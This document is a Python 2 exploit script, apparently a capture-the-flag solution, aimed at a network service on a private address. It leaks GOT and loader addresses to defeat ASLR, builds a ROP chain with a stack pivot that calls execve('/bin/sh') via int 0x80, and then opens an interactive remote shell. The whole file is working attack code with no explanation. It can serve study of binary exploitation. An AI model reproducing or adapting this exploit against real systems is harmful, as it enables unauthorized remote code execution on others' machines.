import socket
import struct
import time
import telnetlib

def p(x):
    return struct.pack('<I', x)

def up(x):
    return struct.unpack('<I', x)[0]

def readuntil(f, delim='msg?\n'):
    d = ''
    while not d.endswith(delim):
        n = f.read(1)
        if len(n) == 0:
            print 'EOF'
            break
        d += n
    return d[:-len(delim)]

host = '192.168.165.137'
port = 1338

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
f = s.makefile('rw', bufsize=0)

'''
0x00017ab8: mov edx, dword [ecx+0x14] ; mov ebx, dword [ecx] ; mov esi, dword [ecx+0x04] ; mov edi, dword [ecx+0x08] ; mov ebp, dword [ecx+0x0C] ; mov esp, dword [ecx+0x10] ; jmp edx ; 
'''

readuntil(f, ' : ')
f.write('2384\n')

printf_got = 0x0804a00c
f.write('1\n')
f.write(str(printf_got) + '\n')

f.write('2\n')
readuntil(f, 'echo = ')
recv = readuntil(f, '\n')
#print recv
printf_addr = int(recv, 10)
libc_base = (0x100000000 + printf_addr) - 0x4d280
print 'libc base: %s' % hex(libc_base)
gets_addr = libc_base + 0x64cd0
print 'gets addr: %s' % hex(gets_addr)

dl_resolve_got = libc_base + 0x1aa008
f.write('1\n')
f.write(str(dl_resolve_got - 0x100000000) + '\n')

f.write('2\n')
readuntil(f, 'echo = ')
recv = readuntil(f, '\n')
#print recv
dl_resolve_addr = int(recv, 10)
ld_base = (0x100000000 + dl_resolve_addr) - 0x144f0
print 'ld base: %s' % hex(ld_base)

buf = ld_base - 0x5000
print 'buf base: %s' % hex(buf)

pivot = ld_base + 0x17ab8
binsh = libc_base + 0x160a24
ret = 0x8048396
pop_edx_ecx_eax_ret = libc_base + 0xef74f
pop_ebx_ret = 0x80483ad
int80 = ld_base + 0xe03

f.write('3\n')
f.write('4\n')

payload = str(gets_addr - 0x100000000)
payload += ' '
payload += '2'

payload += 'A' * 4 # 0xc ebp
payload += p(buf + 0x18) # 0x10 esp
payload += p(ret) # 0x14 edx -> jmp edx
payload += p(pop_edx_ecx_eax_ret)
payload += p(0)
payload += p(0)
payload += p(0xb)
payload += p(pop_ebx_ret)
payload += p(binsh)
payload += p(int80) 

payload += '\n'
payload += '3 4 '
payload += str(pivot - 0x100000000)
payload += ' '

raw_input(payload)
f.write(payload)

t = telnetlib.Telnet()
t.sock = s
t.interact()
